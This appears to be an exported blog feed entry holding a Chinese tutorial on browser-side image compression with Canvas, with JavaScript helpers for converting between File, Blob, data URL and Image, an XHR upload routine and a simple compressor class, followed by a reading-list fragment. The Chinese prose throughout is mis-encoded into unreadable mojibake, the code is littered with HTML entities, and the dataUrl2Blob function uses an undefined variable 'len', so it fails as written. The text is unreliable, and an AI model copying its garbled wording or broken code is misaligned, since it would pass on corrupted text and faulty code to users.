å­—ç¬¦ä¸²ä½œä¸ºå›¾ç‰‡ srcï¼Œè¿˜å¯ä»¥ç›´æŽ¥ç”¨ URL å¯¹è±¡ï¼Œå¼•ç”¨ä¿å­˜åœ¨ File å’Œ Blob ä¸­æ•°æ®çš„ URLã€‚ä½¿ç”¨å¯¹è±¡ URL çš„å¥½å¤„æ˜¯å¯ä»¥ä¸å¿…æŠŠæ–‡ä»¶å†…å®¹è¯»å–åˆ° JavaScript ä¸­ è€Œç›´æŽ¥ä½¿ç”¨æ–‡ä»¶å†…å®¹ã€‚ä¸ºæ­¤ï¼Œåªè¦åœ¨éœ€è¦æ–‡ä»¶å†…å®¹çš„åœ°æ–¹æä¾›å¯¹è±¡ URL å³å¯ã€‚ 12345678910111213141516171819function file2Image(file, callback) &#123; var image = new Image(); var URL = window.webkitURL || window.URL; if (URL) &#123; var url = URL.createObjectURL(file); image.onload = function() &#123; callback(image); URL.revokeObjectURL(url); &#125;; image.src = url; &#125; else &#123; inputFile2DataUrl(file, function(dataUrl) &#123; image.onload = function() &#123; callback(image); &#125; image.src = dataUrl; &#125;); &#125;&#125; æ³¨æ„ï¼šè¦åˆ›å»ºå¯¹è±¡ URLï¼Œå¯ä»¥ä½¿ç”¨ window.URL.createObjectURL() æ–¹æ³•ï¼Œå¹¶ä¼ å…¥ File æˆ– Blob å¯¹è±¡ã€‚å¦‚æžœä¸å†éœ€è¦ç›¸åº”æ•°æ®ï¼Œæœ€å¥½é‡Šæ”¾å®ƒå ç”¨çš„å†…å®¹ã€‚ä½†åªè¦æœ‰ä»£ç åœ¨å¼•ç”¨å¯¹è±¡ URLï¼Œå†…å­˜å°±ä¸ä¼šé‡Šæ”¾ã€‚è¦æ‰‹å·¥é‡Šæ”¾å†…å­˜ï¼Œå¯ä»¥æŠŠå¯¹è±¡ URL ä¼ ç»™ URL.revokeObjectURL()ã€‚ url2Image(url, callback)é€šè¿‡å›¾ç‰‡é“¾æŽ¥ï¼ˆurlï¼‰èŽ·å–å›¾ç‰‡ Image å¯¹è±¡ï¼Œç”±äºŽå›¾ç‰‡åŠ è½½æ˜¯å¼‚æ­¥çš„ï¼Œå› æ­¤æ”¾åˆ°å›žè°ƒå‡½æ•° callback å›žä¼ èŽ·å–åˆ°çš„ Image å¯¹è±¡ã€‚ 1234567function url2Image(url, callback) &#123; var image = new Image(); image.src = url; image.onload = function() &#123; callback(image); &#125;&#125; image2Canvas(image)åˆ©ç”¨ drawImage() æ–¹æ³•å°† Image å¯¹è±¡ç»˜ç”»åœ¨ Canvas å¯¹è±¡ä¸Šã€‚ drawImage æœ‰ä¸‰ç§è¯­æ³•å½¢å¼ï¼š void ctx.drawImage(image, dx, dy); void ctx.drawImage(image, dx, dy, dWidth, dHeight); void ctx.drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight); å‚æ•°ï¼š image ç»˜åˆ¶åˆ°ä¸Šä¸‹æ–‡çš„å…ƒç´ ï¼› sx ç»˜åˆ¶é€‰æ‹©æ¡†å·¦ä¸Šè§’ä»¥ Image ä¸ºåŸºå‡† X è½´åæ ‡ï¼› sy ç»˜åˆ¶é€‰æ‹©æ¡†å·¦ä¸Šè§’ä»¥ Image ä¸ºåŸºå‡† Y è½´åæ ‡ï¼› sWidth ç»˜åˆ¶é€‰æ‹©æ¡†å®½åº¦ï¼› sHeight ç»˜åˆ¶é€‰æ‹©æ¡†å®½åº¦ï¼› dx Image çš„å·¦ä¸Šè§’åœ¨ç›®æ ‡ canvas ä¸Š X è½´åæ ‡ï¼› dy Image çš„å·¦ä¸Šè§’åœ¨ç›®æ ‡ canvas ä¸Š Y è½´åæ ‡ï¼› dWidth Image åœ¨ç›®æ ‡ canvas ä¸Šç»˜åˆ¶çš„å®½åº¦ï¼› dHeight Image åœ¨ç›®æ ‡ canvas ä¸Šç»˜åˆ¶çš„é«˜åº¦ï¼› 12345678function image2Canvas(image) &#123; var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); canvas.width = image.naturalWidth; canvas.height = image.naturalHeight; ctx.drawImage(image, 0, 0, canvas.width, canvas.height); return canvas;&#125; canvas2DataUrl(canvas, quality, type)HTMLCanvasElement å¯¹è±¡æœ‰ toDataURL(type, encoderOptions) æ–¹æ³•ï¼Œè¿”å›žä¸€ä¸ªåŒ…å«å›¾ç‰‡å±•ç¤ºçš„ data URL ã€‚åŒæ—¶å¯ä»¥æŒ‡å®šè¾“å‡ºæ ¼å¼å’Œè´¨é‡ã€‚ å‚æ•°åˆ†åˆ«ä¸ºï¼š type å›¾ç‰‡æ ¼å¼ï¼Œé»˜è®¤ä¸º image/pngã€‚ encoderOptions åœ¨æŒ‡å®šå›¾ç‰‡æ ¼å¼ä¸º image/jpeg æˆ– image/webp çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä»Ž 0 åˆ° 1 çš„åŒºé—´å†…é€‰æ‹©å›¾ç‰‡çš„è´¨é‡ã€‚å¦‚æžœè¶…å‡ºå–å€¼èŒƒå›´ï¼Œå°†ä¼šä½¿ç”¨é»˜è®¤å€¼ 0.92ï¼Œå…¶ä»–å‚æ•°ä¼šè¢«å¿½ç•¥ã€‚ 123function canvas2DataUrl(canvas, quality, type) &#123; return canvas.toDataURL(type || 'image/jpeg', quality || 0.8);&#125; dataUrl2Image(dataUrl, callback)å›¾ç‰‡é“¾æŽ¥ä¹Ÿå¯ä»¥æ˜¯ base64 å­—ç¬¦ä¸²ï¼Œç›´æŽ¥èµ‹å€¼ç»™ Image å¯¹è±¡ src å³å¯ã€‚ 1234567function dataUrl2Image(dataUrl, callback) &#123; var image = new Image(); image.onload = function() &#123; callback(image); &#125;; image.src = dataUrl;&#125; dataUrl2Blob(dataUrl, type)å°† data URL å­—ç¬¦ä¸²è½¬åŒ–ä¸º Blob å¯¹è±¡ã€‚ä¸»è¦æ€è·¯æ˜¯ï¼šå…ˆå°† data URL æ•°æ®ï¼ˆdataï¼‰ éƒ¨åˆ†æå–å‡ºæ¥ï¼Œç”¨ atob å¯¹ç»è¿‡ base64 ç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œå†è½¬åŒ–æˆ Unicode ç¼–ç ï¼Œå­˜å‚¨åœ¨Uint8Arrayï¼ˆ8ä½æ— ç¬¦å·æ•´åž‹æ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼‰ ç±»åž‹æ•°ç»„ï¼Œæœ€ç»ˆè½¬åŒ–æˆ Blob å¯¹è±¡ã€‚ 123456789101112function dataUrl2Blob(dataUrl, type) &#123; var data = dataUrl.split(',')[1]; var mimePattern = /^data:(.*?)(;base64)?,/; var mime = dataUrl.match(mimePattern)[1]; var binStr = atob(data); var arr = new Uint8Array(len); for (var i = 0; i &lt; len; i++) &#123; arr[i] = binStr.charCodeAt(i); &#125; return new Blob([arr], &#123;type: type || mime&#125;);&#125; canvas2Blob(canvas, callback, quality, type)HTMLCanvasElement æœ‰ toBlob(callback, [type], [encoderOptions]) æ–¹æ³•åˆ›é€  Blob å¯¹è±¡ï¼Œç”¨ä»¥å±•ç¤º canvas ä¸Šçš„å›¾ç‰‡ï¼›è¿™ä¸ªå›¾ç‰‡æ–‡ä»¶å¯ä»¥è¢«ç¼“å­˜æˆ–ä¿å­˜åˆ°æœ¬åœ°ï¼Œç”±ç”¨æˆ·ä»£ç†ç«¯è‡ªè¡Œå†³å®šã€‚ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šå›¾ç‰‡æ ¼å¼ï¼Œå¦‚ä¸ç‰¹åˆ«æŒ‡æ˜Žï¼Œå›¾ç‰‡çš„ç±»åž‹é»˜è®¤ä¸º image/pngï¼Œåˆ†è¾¨çŽ‡ä¸º 96dpiã€‚ç¬¬ä¸‰ä¸ªå‚æ•°ç”¨äºŽé’ˆå¯¹image/jpeg æ ¼å¼çš„å›¾ç‰‡è¿›è¡Œè¾“å‡ºå›¾ç‰‡çš„è´¨é‡è®¾ç½®ã€‚ 12345function canvas2Blob(canvas, callback, quality, type)&#123; canvas.toBlob(function(blob) &#123; callback(blob); &#125;, type || 'image/jpeg', quality || 0.8);&#125; ä¸ºå…¼å®¹ä½Žç‰ˆæœ¬æµè§ˆå™¨ï¼Œä½œä¸º toBlob çš„ polyfill æ–¹æ¡ˆï¼Œå¯ä»¥ç”¨ä¸Šé¢ data URL ç”Ÿæˆ Blob æ–¹æ³• dataUrl2Blob ä½œä¸ºHTMLCanvasElement åŽŸåž‹æ–¹æ³•ã€‚ 12345678if (!HTMLCanvasElement.prototype.toBlob) &#123; Object.defineProperty(HTMLCanvasElement.prototype, 'toBlob', &#123; value: function (callback, type, quality) &#123; let dataUrl = this.toDataURL(type, quality); callback(dataUrl2Blob(dataUrl)); &#125; &#125;);&#125; blob2DataUrl(blob, callback)å°† Blob å¯¹è±¡è½¬åŒ–æˆ data URL æ•°æ®ï¼Œç”±äºŽ FileReader çš„å®žä¾‹ readAsDataURL æ–¹æ³•ä¸ä»…æ”¯æŒè¯»å–æ–‡ä»¶ï¼Œè¿˜æ”¯æŒè¯»å– Blob å¯¹è±¡æ•°æ®ï¼Œè¿™é‡Œå¤ç”¨ä¸Šé¢ file2DataUrl æ–¹æ³•å³å¯ï¼š 123function blob2DataUrl(blob, callback) &#123; file2DataUrl(blob, callback);&#125; blob2Image(blob, callback)å°† Blob å¯¹è±¡è½¬åŒ–æˆ Image å¯¹è±¡ï¼Œå¯é€šè¿‡ URL å¯¹è±¡å¼•ç”¨æ–‡ä»¶ï¼Œä¹Ÿæ”¯æŒå¼•ç”¨ Blob è¿™æ ·çš„ç±»æ–‡ä»¶å¯¹è±¡ï¼ŒåŒæ ·ï¼Œè¿™é‡Œå¤ç”¨ä¸Šé¢ file2Image æ–¹æ³•å³å¯ï¼š 123function blob2Image(blob, callback) &#123; file2Image(blob, callback);&#125; upload(url, file, callback)ä¸Šä¼ å›¾ç‰‡ï¼ˆå·²åŽ‹ç¼©ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ FormData ä¼ å…¥æ–‡ä»¶å¯¹è±¡ï¼Œé€šè¿‡ XHR ç›´æŽ¥æŠŠæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ 123456789101112131415function upload(url, file, callback) &#123; var xhr = new XMLHttpRequest(); var fd = new FormData(); fd.append('file', file); xhr.onreadystatechange = function () &#123; if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; // ä¸Šä¼ æˆåŠŸ callback &amp;&amp; callback(xhr.responseText); &#125; else &#123; throw new Error(xhr); &#125; &#125; xhr.open('POST', url, true); xhr.send(fd);&#125; ä¹Ÿå¯ä»¥ä½¿ç”¨ FileReader è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè½¬åŒ–æˆäºŒè¿›åˆ¶ä¸Šä¼  123456789101112function upload(url, file) &#123; var reader = new FileReader(); var xhr = new XMLHttpRequest(); xhr.open('POST', url, true); xhr.overrideMimeType('text/plain; charset=x-user-defined-binary'); reader.onload = function() &#123; xhr.send(reader.result); &#125;; reader.readAsBinaryString(file);&#125; å®žçŽ°ç®€æ˜“å›¾ç‰‡åŽ‹ç¼©åœ¨ç†Ÿæ‚‰ä»¥ä¸Šå„ç§å›¾ç‰‡è½¬åŒ–æ–¹æ³•çš„å…·ä½“å®žçŽ°ï¼Œå°†å®ƒä»¬å°è£…åœ¨ä¸€ä¸ªå…¬ç”¨å¯¹è±¡ util é‡Œï¼Œå†ç»“åˆåŽ‹ç¼©è½¬åŒ–æµç¨‹å›¾ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•å®žçŽ°å›¾ç‰‡åŽ‹ç¼©äº†ï¼šé¦–å…ˆå°†ä¸Šä¼ å›¾ç‰‡è½¬åŒ–æˆ Image å¯¹è±¡ï¼Œå†å°†å†™å…¥åˆ° Canvas ç”»å¸ƒï¼Œæœ€åŽç”± Canvas å¯¹è±¡ API å¯¹å›¾ç‰‡çš„å¤§å°å’Œå°ºå¯¸è¾“å‡ºè°ƒæ•´ï¼Œå®žçŽ°åŽ‹ç¼©ç›®çš„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778/** * ç®€æ˜“å›¾ç‰‡åŽ‹ç¼©æ–¹æ³• * @param &#123;Object&#125; options ç›¸å…³å‚æ•° */(function (win) &#123; var REGEXP_IMAGE_TYPE = /^image\//; var util = &#123;&#125;; var defaultOptions = &#123; file: null, quality: 0.8 &#125;; var isFunc = function (fn) &#123; return typeof fn === 'function'; &#125;; var isImageType = function (value) &#123; return REGEXP_IMAGE_TYPE.test(value); &#125;; /** * ç®€æ˜“å›¾ç‰‡åŽ‹ç¼©æž„é€ å‡½æ•° * @param &#123;Object&#125; options ç›¸å…³å‚æ•° */ function SimpleImageCompressor(options) &#123; options = Object.assign(&#123;&#125;, defaultOptions, options); this.options = options; this.file = options.file; this.init(); &#125; var _proto = SimpleImageCompressor.prototype; win.SimpleImageCompressor = SimpleImageCompressor; /** * åˆå§‹åŒ– */ _proto.init = function init() &#123; var _this = this; var file = this.file; var options = this.options; if (!file || !isImageType(file.type)) &#123; console.error('è¯·ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶!'); return; &#125; if (!isImageType(options.mimeType)) &#123; options.mimeType = file.type; &#125; util.file2Image(file, function (img) &#123; var canvas = util.image2Canvas(img); file.width = img.naturalWidth; file.height = img.naturalHeight; _this.beforeCompress(file, canvas); util.canvas2Blob(canvas, function (blob) &#123; blob.width = canvas.width; blob.height = canvas.height; options.success &amp;&amp; options.success(blob); &#125;, options.quality, options.mimeType) &#125;) &#125; /** * åŽ‹ç¼©ä¹‹å‰ï¼Œè¯»å–å›¾ç‰‡ä¹‹åŽé’©å­å‡½æ•° */ _proto.beforeCompress = function beforeCompress() &#123; if (isFunc(this.options.beforeCompress)) &#123; this.options.beforeCompress(this.file); &#125; &#125; // çœç•¥ `util` å…¬ç”¨æ–¹æ³•å®šä¹‰ // ... // å°† `util` å…¬ç”¨æ–¹æ³•æ·»åŠ åˆ°å®žä¾‹çš„é™æ€å±žæ€§ä¸Š for (key in util) &#123; if (util.hasOwnProperty(key)) &#123; SimpleImageCompressor[key] = util[key]; &#125; &#125;&#125;)(window) è¿™ä¸ªç®€æ˜“å›¾ç‰‡åŽ‹ç¼©æ–¹æ³•è°ƒç”¨å’Œå…¥å‚ï¼š 123456789101112131415161718192021222324252627282930313233343536var fileEle = document.getElementById('file');fileEle.addEventListener('change', function () &#123; file = this.files[0]; var options = &#123; file: file, quality: 0.6, mimeType: 'image/jpeg', // åŽ‹ç¼©å‰å›žè°ƒ beforeCompress: function (result) &#123; console.log('åŽ‹ç¼©ä¹‹å‰å›¾ç‰‡å°ºå¯¸å¤§å°: ', result.size); console.log('mime ç±»åž‹: ', result.type); // å°†ä¸Šä¼ å›¾ç‰‡åœ¨é¡µé¢é¢„è§ˆ // SimpleImageCompressor.file2DataUrl(result, function (url) &#123; // document.getElementById('origin').src = url; // &#125;) &#125;, // åŽ‹ç¼©æˆåŠŸå›žè°ƒ success: function (result) &#123; console.log('åŽ‹ç¼©ä¹‹åŽå›¾ç‰‡å°ºå¯¸å¤§å°: ', result.size); console.log('mime ç±»åž‹: ', result.type); console.log('åŽ‹ç¼©çŽ‡ï¼š ', (result.size / file.size * 100).toFixed(2) + '%'); // ç”ŸæˆåŽ‹ç¼©åŽå›¾ç‰‡åœ¨é¡µé¢å±•ç¤º // SimpleImageCompressor.file2DataUrl(result, function (url) &#123; // document.getElementById('output').src = url; // &#125;) // ä¸Šä¼ åˆ°è¿œç¨‹æœåŠ¡å™¨ // SimpleImageCompressor.upload('/upload.png', result); &#125; &#125;; new SimpleImageCompressor(options);&#125;, false); å¦‚æžœçœ‹åˆ°è¿™é‡Œçš„å®¢å®˜ä¸å«Œå¼ƒè¿™ä¸ª demo å¤ªç®€å•å¯ä»¥æˆ³è¿™é‡Œè¯•è¯•æ°´ã€‚å¦‚æžœä½ æœ‰è¶³å¤Ÿçš„è€å¿ƒå¤šä¼ å‡ ç§ç±»åž‹å›¾ç‰‡å°±ä¼šå‘çŽ°è¿˜å­˜åœ¨å¦‚ä¸‹é—®é¢˜ï¼š åŽ‹ç¼©è¾“å‡ºå›¾ç‰‡å¯¸å°ºå›ºå®šä¸ºåŽŸå§‹å›¾ç‰‡å°ºå¯¸å¤§å°ï¼Œè€Œå®žé™…å¯èƒ½éœ€è¦æŽ§åˆ¶è¾“å‡ºå›¾ç‰‡å°ºå¯¸ï¼ŒåŒæ—¶è¾¾åˆ°å°ºå¯¸ä¹Ÿè¢«åŽ‹ç¼©ç›®çš„ï¼› png æ ¼å¼å›¾ç‰‡åŒæ ¼å¼åŽ‹ç¼©ï¼ŒåŽ‹ç¼©çŽ‡ä¸é«˜ï¼Œè¿˜æœ‰å¯èƒ½å‡ºçŽ°â€œä¸å‡åå¢žâ€çŽ°è±¡ï¼› æœ‰äº›æƒ…å†µï¼Œå…¶ä»–æ ¼å¼è½¬åŒ–æˆ png æ ¼å¼ä¹Ÿä¼šå‡ºçŽ°â€œä¸å‡åå¢žâ€çŽ°è±¡ï¼› å¤§å°ºå¯¸ png æ ¼å¼å›¾ç‰‡åœ¨ä¸€äº›æ‰‹æœºä¸Šï¼ŒåŽ‹ç¼©åŽå‡ºçŽ°â€œé»‘å±â€çŽ°è±¡ï¼› æ”¹è¿›ç‰ˆå›¾ç‰‡åŽ‹ç¼©ä¿—è¯è¯´â€œç½—é©¬ä¸æ˜¯ä¸€å¤©å»ºæˆçš„â€ï¼Œé€šè¿‡ä¸Šè¿°å®žéªŒï¼Œæˆ‘ä»¬å‘çŽ°äº†å¾ˆå¤šä¸è¶³ï¼Œä¸‹é¢å°†é€æ¡é—®é¢˜åˆ†æžï¼Œå¯»æ±‚è§£å†³æ–¹æ¡ˆã€‚ åŽ‹ç¼©è¾“å‡ºå›¾ç‰‡å¯¸å°ºå›ºå®šä¸ºåŽŸå§‹å›¾ç‰‡å°ºå¯¸å¤§å°ï¼Œè€Œå®žé™…å¯èƒ½éœ€è¦æŽ§åˆ¶è¾“å‡ºå›¾ç‰‡å°ºå¯¸ï¼ŒåŒæ—¶è¾¾åˆ°å°ºå¯¸ä¹Ÿè¢«åŽ‹ç¼©ç›®çš„ï¼› ä¸ºäº†é¿å…åŽ‹ç¼©å›¾ç‰‡å˜å½¢ï¼Œä¸€èˆ¬é‡‡ç”¨ç­‰æ¯”ç¼©æ”¾ï¼Œé¦–å…ˆè¦è®¡ç®—å‡ºåŽŸå§‹å›¾ç‰‡å®½é«˜æ¯” aspectRatioï¼Œç”¨æˆ·è®¾ç½®çš„é«˜ä¹˜ä»¥ aspectRatioï¼Œå¾—å‡ºç­‰æ¯”ç¼©æ”¾åŽçš„å®½ï¼Œè‹¥æ¯”ç”¨æˆ·è®¾ç½®å®½çš„å°ï¼Œåˆ™ç”¨æˆ·è®¾ç½®çš„é«˜ä¸ºä¸ºåŸºå‡†ç¼©æ”¾ï¼Œå¦åˆ™ä»¥å®½ä¸ºåŸºå‡†ç¼©æ”¾ã€‚ 12345678var aspectRatio = naturalWidth / naturalHeight;var width = Math.max(options.width, 0) || naturalWidth;var height = Math.max(options.height, 0) || naturalHeight;if (height * aspectRatio &gt; width) &#123; height = width / aspectRatio;&#125; else &#123; width = height * aspectRatio;&#125; è¾“å‡ºå›¾ç‰‡çš„å°ºå¯¸ç¡®å®šäº†ï¼ŒæŽ¥ä¸‹æ¥å°±æ˜¯æŒ‰è¿™ä¸ªå°ºå¯¸åˆ›å»ºä¸€ä¸ª Canvas ç”»å¸ƒï¼Œå°†å›¾ç‰‡ç”»ä¸ŠåŽ»ã€‚è¿™é‡Œå¯ä»¥å°†ä¸Šé¢æåˆ°çš„ image2Canvas æ–¹æ³•ç¨å¾®åšä¸€ä¸‹æ”¹é€ ï¼š 12345678function image2Canvas(image, destWidth, destHeight) &#123; var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); canvas.width = destWidth || image.naturalWidth; canvas.height = destHeight || image.naturalHeight; ctx.drawImage(image, 0, 0, canvas.width, canvas.height); return canvas;&#125; png æ ¼å¼å›¾ç‰‡åŒæ ¼å¼åŽ‹ç¼©ï¼ŒåŽ‹ç¼©çŽ‡ä¸é«˜ï¼Œè¿˜æœ‰å¯èƒ½å‡ºçŽ°â€œä¸å‡åå¢žâ€çŽ°è±¡ ä¸€èˆ¬çš„ï¼Œä¸å»ºè®®å°† png æ ¼å¼å›¾ç‰‡åŽ‹ç¼©æˆè‡ªèº«æ ¼å¼ï¼Œè¿™æ ·åŽ‹ç¼©çŽ‡ä¸ç†æƒ³ï¼Œæœ‰æ—¶åè€Œä¼šé€ æˆè‡ªèº«è´¨é‡å˜å¾—æ›´å¤§ã€‚ å› ä¸ºæˆ‘ä»¬åœ¨â€œå…·ä½“å®žçŽ°â€ä¸­ä¸¤ä¸ªæœ‰å…³åŽ‹ç¼©å…³é”® APIï¼š toBlob(callback, [type], [encoderOptions]) å‚æ•° encoderOptions ç”¨äºŽé’ˆå¯¹image/jpeg æ ¼å¼çš„å›¾ç‰‡è¿›è¡Œè¾“å‡ºå›¾ç‰‡çš„è´¨é‡è®¾ç½®ï¼› toDataURL(type, encoderOptions å‚æ•°encoderOptions åœ¨æŒ‡å®šå›¾ç‰‡æ ¼å¼ä¸º image/jpeg æˆ– image/webp çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä»Ž 0 åˆ° 1 çš„åŒºé—´å†…é€‰æ‹©å›¾ç‰‡çš„è´¨é‡ã€‚ å‡æœªå¯¹ png æ ¼å¼å›¾ç‰‡æœ‰åŽ‹ç¼©æ•ˆæžœã€‚ æœ‰ä¸ªæŠ˜è¡·çš„æ–¹æ¡ˆï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªé˜ˆå€¼ï¼Œå¦‚æžœ png å›¾ç‰‡çš„è´¨é‡å°äºŽè¿™ä¸ªå€¼ï¼Œå°±è¿˜æ˜¯åŽ‹ç¼©è¾“å‡º png æ ¼å¼ï¼Œè¿™æ ·æœ€å·®çš„è¾“å‡ºç»“æžœä¸è‡³äºŽè´¨é‡å¤ªå¤§ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šï¼Œå¦‚æžœåŽ‹ç¼©åŽå›¾ç‰‡å¤§å° â€œä¸å‡åå¢žâ€ï¼Œæˆ‘ä»¬å°±å…œåº•å¤„ç†è¾“å‡ºæºå›¾ç‰‡ç»™ç”¨æˆ·ã€‚å½“å›¾ç‰‡è´¨é‡å¤§äºŽæŸä¸ªå€¼æ—¶ï¼Œæˆ‘ä»¬åŽ‹ç¼©æˆ jpeg æ ¼å¼ã€‚ 12345678910// `png` æ ¼å¼å›¾ç‰‡å¤§å°è¶…è¿‡ `convertSize`, è½¬åŒ–æˆ `jpeg` æ ¼å¼if (file.size &gt; options.convertSize &amp;&amp; options.mimeType === 'image/png') &#123; options.mimeType = 'image/jpeg';&#125;// çœç•¥ä¸€äº›ä»£ç // ...// ç”¨æˆ·æœŸå¾…çš„è¾“å‡ºå®½é«˜æ²¡æœ‰å¤§äºŽæºå›¾ç‰‡çš„å®½é«˜æƒ…å†µä¸‹ï¼Œè¾“å‡ºæ–‡ä»¶å¤§å°å¤§äºŽæºæ–‡ä»¶ï¼Œè¿”å›žæºæ–‡ä»¶if (result.size &gt; file.size &amp;&amp; !(options.width &gt; naturalWidth || options.height &gt; naturalHeight)) &#123; result = file;&#125; å¤§å°ºå¯¸ png æ ¼å¼å›¾ç‰‡åœ¨ä¸€äº›æ‰‹æœºä¸Šï¼ŒåŽ‹ç¼©åŽå‡ºçŽ°â€œé»‘å±â€çŽ°è±¡ï¼› ç”±äºŽå„å¤§æµè§ˆå™¨å¯¹ Canvas æœ€å¤§å°ºå¯¸æ”¯æŒä¸åŒ æµè§ˆå™¨ æœ€å¤§å®½é«˜ æœ€å¤§é¢ç§¯ Chrome 32,767 pixels 268,435,456 pixels(e.g.16,384 x 16,384) Firefox 32,767 pixels 472,907,776 pixels(e.g.22,528 x 20,992) IE 8,192 pixels N/A IE Mobile 4,096 pixels N/A å¦‚æžœå›¾ç‰‡å°ºå¯¸è¿‡å¤§ï¼Œåœ¨åˆ›å»ºåŒå°ºå¯¸ç”»å¸ƒï¼Œå†ç”»ä¸Šå›¾ç‰‡ï¼Œå°±ä¼šå‡ºçŽ°å¼‚å¸¸æƒ…å†µï¼Œå³ç”Ÿæˆçš„ç”»å¸ƒæ²¡æœ‰å›¾ç‰‡åƒç´ ï¼Œè€Œç”»å¸ƒæœ¬èº«é»˜è®¤ç»™çš„èƒŒæ™¯è‰²ä¸ºé»‘è‰²ï¼Œè¿™æ ·å°±å¯¼è‡´å›¾ç‰‡â€œé»‘å±â€æƒ…å†µã€‚ è¿™é‡Œå¯ä»¥é€šè¿‡æŽ§åˆ¶è¾“å‡ºå›¾ç‰‡æœ€å¤§å®½é«˜é˜²æ­¢ç”Ÿæˆç”»å¸ƒè¶Šç•Œï¼Œå¹¶ä¸”ç”¨é€æ˜Žè‰²è¦†ç›–é»˜è®¤é»‘è‰²èƒŒæ™¯è§£å†³è§£å†³â€œé»‘å±â€é—®é¢˜ï¼š 1234567891011121314151617181920212223242526272829303132333435363738// ...// é™åˆ¶æœ€å°å’Œæœ€å¤§å®½é«˜var maxWidth = Math.max(options.maxWidth, 0) || Infinity;var maxHeight = Math.max(options.maxHeight, 0) || Infinity;var minWidth = Math.max(options.minWidth, 0) || 0;var minHeight = Math.max(options.minHeight, 0) || 0;if (maxWidth &lt; Infinity &amp;&amp; maxHeight &lt; Infinity) &#123; if (maxHeight * aspectRatio &gt; maxWidth) &#123; maxHeight = maxWidth / aspectRatio; &#125; else &#123; maxWidth = maxHeight * aspectRatio; &#125;&#125; else if (maxWidth &lt; Infinity) &#123; maxHeight = maxWidth / aspectRatio;&#125; else if (maxHeight &lt; Infinity) &#123; maxWidth = maxHeight * aspectRatio;&#125;if (minWidth &gt; 0 &amp;&amp; minHeight &gt; 0) &#123; if (minHeight * aspectRatio &gt; minWidth) &#123; minHeight = minWidth / aspectRatio; &#125; else &#123; minWidth = minHeight * aspectRatio; &#125;&#125; else if (minWidth &gt; 0) &#123; minHeight = minWidth / aspectRatio;&#125; else if (minHeight &gt; 0) &#123; minWidth = minHeight * aspectRatio;&#125;width = Math.floor(Math.min(Math.max(width, minWidth), maxWidth));height = Math.floor(Math.min(Math.max(height, minHeight), maxHeight));// ...// è¦†ç›–é»˜è®¤å¡«å……é¢œè‰² (#000)var fillStyle = 'transparent';context.fillStyle = fillStyle; åˆ°è¿™é‡Œï¼Œä¸Šè¿°çš„æ„å¤–é—®é¢˜è¢«æˆ‘ä»¬ä¸€ä¸€è§£å†³äº†ï¼Œå¦‚éœ€ä½“éªŒæ”¹è¿›ç‰ˆçš„å›¾ç‰‡åŽ‹ç¼© demo çš„å°ä¼™ä¼´å¯ä»¥æˆ³è¿™é‡Œ æ€»ç»“æˆ‘ä»¬æ¢³ç†äº†é€šè¿‡é¡µé¢æ ‡ç­¾ &lt;input type=&quot;file&quot; /&gt; ä¸Šä¼ æœ¬åœ°å›¾ç‰‡åˆ°å›¾ç‰‡è¢«åŽ‹ç¼©æ•´ä¸ªè¿‡ç¨‹ï¼Œä¹Ÿè¦†ç›–åˆ°äº†åœ¨å®žé™…ä½¿ç”¨ä¸­è¿˜å­˜åœ¨çš„ä¸€äº›æ„å¤–æƒ…å†µï¼Œæä¾›äº†ç›¸åº”çš„è§£å†³æ–¹æ¡ˆã€‚å°†æ”¹è¿›ç‰ˆå›¾ç‰‡åŽ‹ç¼©æ•´ç†æˆæ’ä»¶ï¼Œå·²ä¸Šä¼  npm ï¼Œå¯é€šè¿‡ npm install js-image-compressor -D å®‰è£…ä½¿ç”¨ï¼Œå¯ä»¥ä»Ž github ä¸‹è½½ã€‚æ•´ç†åŒ†å¿™ï¼Œå¦‚æœ‰é—®é¢˜æ¬¢è¿Žå¤§å®¶æŒ‡æ­£ï¼Œå®Œï½ž]]></content>
      <tags>
        <tag>javacript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æˆ‘çš„é˜…è¯»æ¸…å•]]></title>
    <url>%2F2020%2F05%2F29%2Freading-plan%2F</url>
    <content type="text"><![CDATA[2020-5-29å‚»å‚»åˆ†ä¸æ¸…ä¹‹ Cookieã€Sessionã€Tokenã€JWTPSï¼šæ˜Žæ‰¼è¦çš„å¯¹æ¯”äº†å››è€…ä¹‹é—´çš„å¼‚åŒç‚¹ï¼ŒåŠ æ·±å‰åŽç«¯èº«ä»½æ ¡éªŒçš„è®¤è¯†ï¼Œç›¸å…³é˜…è¯»é˜®ä¸€å³°çš„JSON Web Token å…¥é—¨æ•™ç¨‹ 2020-5-31é¢è¯•å®˜ï¼šä½ å¯ä»¥ç”¨çº¯ CSS åˆ¤æ–­é¼ æ ‡è¿›å…¥çš„æ–¹å‘å—ï¼ŸPSï¼šå®žé™…ç”¨é€”ä¸å¤§ï¼Œä½†æ˜¯æ€è·¯æ¸…æ™°ï¼Œåˆ©ç”¨é¼ æ ‡è¿›å…¥åŒºåŸŸ :hoverï¼Œå’ŒåŠ¨ç”»è¿‡æ¸¡æ•ˆæžœ transition é¢è¯•å®˜é—®äº†ä¸€ä¸‹ä¸‰æ¬¡æ¡æ‰‹ï¼Œæˆ‘ç”©å‡ºè¿™å¼ è„‘å›¾ï¼Œä»–æœäº†ï¼PSï¼šæ·±å…¥ HTTP ä¸‰æ¬¡æ¡æ‰‹éƒ¨åˆ† 